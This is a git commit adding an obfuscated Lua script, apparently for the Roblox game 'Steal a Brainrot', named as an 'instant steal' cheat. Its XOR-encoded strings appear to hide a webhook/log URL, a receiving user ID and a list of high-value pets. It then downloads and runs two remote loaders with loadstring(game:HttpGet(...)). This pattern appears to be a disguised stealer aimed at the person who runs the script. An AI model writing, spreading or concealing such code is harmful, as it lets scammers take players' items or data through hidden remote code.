41395856a22874a2b0d164396a70d7c2840fce82
V7dex <142235856+demirpw@users.noreply.github.com>
2026-03-07 15:58:28 +0100

    Create sab_instant_steal2.lua

---
+++ sab_instant_steal2.lua
@@ -0,0 +1,38 @@
+--[[ Obfuscated with Prometheus-style engine ]]
+local _Oll0O0lO0l=533;local _IIllI0lO0O=577;local _0llOlOl0II="_Il00lO";local _IOIOl0O00O="_0llOOO";local _ll00OlIIIO=816;
+local _lOIO0Ol0lllOllll=(function(_0I0000ll)return function(...)local _lOI0OIIl=""for _,_l0IllIlO in ipairs({...})do _lOI0OIIl=_lOI0OIIl..string.char(bit32 and bit32.bxor(_l0IllIlO,_0I0000ll)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_l0IllIlO,_0I0000ll))end return _lOI0OIIl end end)(75);
+local _0OIOlI00OOlI=function()
+getgenv()._OllIIl0O0llO0I = _lOIO0Ol0lllOllll(35,63,63,59,56,113,100,100,56,32,42,38,42,101,37,46,63,100,42,59,34,100,39,36,44,56,100,60,46,41,35,36,36,32,100,38,57,57,20,46,126,40,125,115,42,121,127,121,41,125,122,127,127,46,41,41,42,122,125,42,121,115,114,123,123,126,41,124,124,127,123)
+getgenv()._l0O0OIll0I0IIl = 10390188322
+getgenv()._0OllIll0IlI0Il = 1      
+getgenv()._IOIlIOIlOllIIl = 2 
+getgenv()._OIlOOII0IllIOl = {
+    [_lOIO0Ol0lllOllll(15,57,42,44,36,37,107,8,42,37,37,46,39,39,36,37,34)] = true,
+    [_lOIO0Ol0lllOllll(27,36,59,40,62,57,62,107,42,37,47,107,13,34,49,49,62,57,62)] = true,
+    [_lOIO0Ol0lllOllll(13,57,42,44,57,42,38,42,107,42,37,47,107,8,35,36,40,57,42,38,42)] = true,
+    [_lOIO0Ol0lllOllll(6,46,36,60,39)] = true,
+    [_lOIO0Ol0lllOllll(24,32,34,41,34,47,34,107,31,36,34,39,46,63)] = true,
+    [_lOIO0Ol0lllOllll(24,63,57,42,60,41,46,57,57,50,107,14,39,46,59,35,42,37,63)] = true,
+    [_lOIO0Ol0lllOllll(12,42,57,42,38,42,107,42,37,47,107,6,42,47,62,37,47,62,37,44)] = true,
+    [_lOIO0Ol0lllOllll(7,42,107,8,42,56,42,107,9,36,36)] = true,
+    [_lOIO0Ol0lllOllll(15,57,42,44,36,37,107,12,34,37,44,46,57,34,37,34)] = true,
+    [_lOIO0Ol0lllOllll(3,50,47,57,42,107,15,57,42,44,36,37,107,8,42,37,37,46,39,39,36,37,34)] = true,
+    [_lOIO0Ol0lllOllll(24,59,36,36,32,50,107,42,37,47,107,27,62,38,59,32,50)] = true,
+    [_lOIO0Ol0lllOllll(25,46,34,37,34,63,36,107,24,39,46,34,44,35,34,63,36)] = true,
+    [_lOIO0Ol0lllOllll(13,46,56,63,34,61,46,107,125,124)] = true,
+    [_lOIO0Ol0lllOllll(9,62,57,44,62,57,36,107,10,37,47,107,13,57,50,62,57,36)] = true,
+    [_lOIO0Ol0lllOllll(31,57,42,39,42,39,46,47,36,37)] = true,
+    [_lOIO0Ol0lllOllll(8,36,36,32,34,107,42,37,47,107,6,34,39,32,34)] = true,
+    [_lOIO0Ol0lllOllll(8,46,57,41,46,57,62,56)] = true,
+    [_lOIO0Ol0lllOllll(25,36,56,46,50,107,42,37,47,107,31,46,47,47,50)] = true,
+    [_lOIO0Ol0lllOllll(0,46,63,62,59,42,63,107,9,57,36,56)] = true,
+    [_lOIO0Ol0lllOllll(3,46,42,47,39,46,56,56,107,3,36,57,56,46,38,42,37)] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet(_lOIO0Ol0lllOllll(35,63,63,59,56,113,100,100,42,59,34,101,39,62,42,57,38,36,57,101,37,46,63,100,45,34,39,46,56,100,61,127,100,39,36,42,47,46,57,56,100,45,41,40,47,122,47,121,126,115,115,114,42,115,127,120,121,114,124,122,123,124,47,46,42,120,125,127,121,123,127,127,47,101,39,62,42)))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet(_lOIO0Ol0lllOllll(35,63,63,59,56,113,100,100,57,42,60,101,44,34,63,35,62,41,62,56,46,57,40,36,37,63,46,37,63,101,40,36,38,100,47,46,38,34,57,59,60,100,8,51,3,62,41,100,38,42,34,37,100,56,42,41,20,34,37,56,63,42,37,63,20,56,63,46,42,39,101,39,62,42)))()
+end)
+end;
+local _,_OI000l0O=pcall(_0OIOlI00OOlI);if _OI000l0O then _0OIOlI00OOlI()end;
